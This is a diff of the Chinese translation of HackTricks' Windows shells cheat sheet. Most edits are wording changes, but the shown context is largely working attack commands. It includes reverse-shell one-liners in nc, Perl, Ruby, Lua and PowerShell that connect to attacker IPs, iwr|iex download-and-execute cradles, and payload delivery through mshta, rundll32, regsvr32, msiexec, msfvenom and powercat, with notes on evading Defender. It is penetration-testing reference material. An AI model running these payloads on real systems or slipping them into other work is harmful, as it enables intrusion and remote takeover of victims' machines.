@@ -9,14 +9,14 @@
 * 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
 * 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+找到最重要的漏洞，以便更快修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -24,7 +24,7 @@
 
 ## Lolbas
 
-该页面[lolbas-project.github.io](https://lolbas-project.github.io/)是为Windows设计的，就像[https://gtfobins.github.io/](https://gtfobins.github.io/)是为Linux设计的。\
+[这个页面](https://lolbas-project.github.io/)类似于Linux的[https://gtfobins.github.io/](https://gtfobins.github.io/)，专为Windows设计。\
 显然，在Windows中**没有SUID文件或sudo特权**，但了解一些**二进制文件**如何（被）滥用以执行某种意外操作是很有用的，比如**执行任意代码。**
 
 ## NC
@@ -33,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**sbd**是Netcat的克隆版，旨在具有便携性并提供强大的加密功能。它可以在类Unix操作系统和Microsoft Win32上运行。sbd具有AES-CBC-128 + HMAC-SHA1加密（由Christophe Devine提供）、程序执行（-e选项）、选择源端口、延迟连续重新连接以及其他一些不错的功能。sbd仅支持TCP/IP通信。sbd.exe（Kali Linux发行版的一部分：/usr/share/windows-resources/sbd/sbd.exe）可以作为Netcat的替代品上传到Windows系统。 
+**sbd**是Netcat的克隆版，旨在具有便携性并提供强大的加密功能。它可在类Unix操作系统和Microsoft Win32上运行。sbd具有AES-CBC-128 + HMAC-SHA1加密（由Christophe Devine提供）、程序执行（-e选项）、选择源端口、带延迟的连续重新连接以及其他一些不错的功能。sbd仅支持TCP/IP通信。sbd.exe（Kali Linux发行版的一部分：/usr/share/windows-resources/sbd/sbd.exe）可作为Netcat的替代品上传到Windows系统。 
 
 ## Python
 ```bash
@@ -49,14 +49,16 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 ```
 ## Ruby
 
-## Ruby
+### Ruby
+
+Ruby是一种动态、开源的面向对象编程语言，具有简洁而优雅的语法。Ruby广泛用于Web开发，特别是在Ruby on Rails框架中。
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
 
-Lua是一种轻量级、高效的脚本语言，常用于嵌入式系统和游戏开发中。 Lua脚本可以通过解释器执行，也可以编译成字节码运行。 Lua具有简洁的语法和强大的扩展能力，被广泛应用于各种领域。
+Lua是一种轻量级、高效的脚本语言，常用于嵌入式系统和游戏开发中。 Lua脚本可以通过解释器直接执行，也可以编译成字节码运行。 Lua具有简洁的语法和强大的扩展能力，被广泛应用于各种领域。 Lua脚本可以通过调用C函数扩展其功能，使其更加灵活和强大。
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -90,10 +92,8 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/Power
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-网络调用执行的进程: **svchost.exe**\
-写入磁盘的有效载荷: **WebDAV客户端本地缓存**
-
-**一行代码:**
+网络调用执行的进程：**svchost.exe**\
+写入磁盘的有效载荷：**WebDAV客户端本地缓存**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -161,7 +161,7 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 
 #### Mshta - Metasploit
 
-Mshta is a utility in Windows that executes Microsoft HTML Applications (HTA). Metasploit has a module that can be used to execute malicious HTA payloads using mshta.exe. This can be achieved by generating an HTA payload using the mshta_psh module in Metasploit.
+Mshta is a utility in Windows that executes Microsoft HTML Applications (HTA). Metasploit has a module that can be used to execute malicious HTA payloads using Mshta. This technique can be used to bypass application whitelisting since Mshta is a legitimate utility.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -180,13 +180,13 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
-进行网络调用的进程：**svchost.exe**\
+执行网络调用的进程：**svchost.exe**\
 写入磁盘的有效载荷：**WebDAV客户端本地缓存**
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-网络调用执行的进程：**rundll32.exe**\
-写入磁盘的有效载荷：**IE 本地缓存**
+进程执行网络调用：**rundll32.exe**\
+写入磁盘的有效负载：**IE 本地缓存**
 
 **被防御者检测到**
 
@@ -258,8 +258,6 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </scriptlet>
 ```
 #### **Regsvr32 - Metasploit**
-
-#### **Regsvr32 - Metasploit**
 ```bash
 use multi/script/web_delivery
 set target 3
@@ -305,8 +303,8 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-网络调用执行的进程：**svchost.exe**\
-写入磁盘的有效载荷：**WebDAV 客户端本地缓存**
+执行网络调用的进程：**svchost.exe**\
+写入磁盘的有效载荷：**WebDAV客户端本地缓存**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -334,10 +332,10 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-网络调用执行的进程：**wmic.exe**\
-写入磁盘的有效负载：**IE 本地缓存**
+网络调用执行的进程: **wmic.exe**\
+写入磁盘的有效载荷: **IE 本地缓存**
 
-示例 xsl 文件[在这里](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)：
+示例 xsl 文件[在这里](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -373,7 +371,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-您可以从这里下载一个基本的C#反向shell：[https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+你可以从这里下载一个基本的C#反向shell: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **未被检测**
 
@@ -381,8 +379,8 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe s
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-网络调用的进程：**svchost.exe**\
-写入磁盘的有效载荷：**WebDAV客户端本地缓存**
+网络调用执行的进程：**svchost.exe**\
+写入磁盘的载荷：**WebDAV客户端本地缓存**
 
 **我还没有尝试过**
 
@@ -409,7 +407,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-开始在Web服务器上提供脚本，并在受害者端执行它：
+在Web服务器上开始提供脚本，并在受害者端执行它：
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -425,9 +423,11 @@ Defender尚未将其检测为恶意代码（截至2019年3月4日）。
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
+Defender尚未将其检测为恶意代码（截至2019年3月4日）。
+
 **powercat提供的其他选项：**
 
-绑定shell，反向shell（TCP，UDP，DNS），端口重定向，上传/下载，生成载荷，提供文件...
+绑定shell、反向shell（TCP、UDP、DNS）、端口重定向、上传/下载、生成有效载荷、提供文件...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -462,11 +462,11 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-启动msfconsole并使用创建的资源：
+使用创建的资源启动 msfconsole：
 ```
 msfconsole -r unicorn.rc
 ```
-在受害者上启动一个提供_powershell\_attack.txt_文件的Web服务器，并执行：
+在受害者上启动一个提供_powershell\_attack.txt_文件的Web服务器并执行：
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -491,7 +491,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS控制台，预装一些具�
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-找到最重要的漏洞，以便更快修复。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今天。
+找到最重要的漏洞，以便更快修复。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -504,8 +504,8 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS控制台，预装一些具�
 
 * 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
